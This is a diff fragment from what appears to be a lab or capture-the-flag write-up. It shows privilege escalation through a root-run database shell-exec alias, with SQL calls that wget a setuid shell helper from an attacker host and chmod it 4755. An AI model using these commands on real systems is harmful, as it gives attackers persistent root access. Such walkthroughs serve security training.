@@ -167,7 +167,7 @@ CALL SHELLEXEC('id');
 That `id` says root. The cleanest way to keep it is to have the alias drop a tiny setuid helper into place. You compile a four-line C program that calls `setreuid(0,0)` and execs a shell, host it, and have the root-owned database pull it down, mark it executable, and chmod it setuid. Sign the dropped file `iceberg` so you know which artifact is yours.
 
 ```sql
-CALL SHELLEXEC('wget -O /tmp/iceberg http://10.10.14.4/suid 10.10.14.4');
+CALL SHELLEXEC('wget -O /tmp/iceberg http://10.10.14.4/suid');
 CALL SHELLEXEC('chmod 4755 /tmp/iceberg');
 ```
 
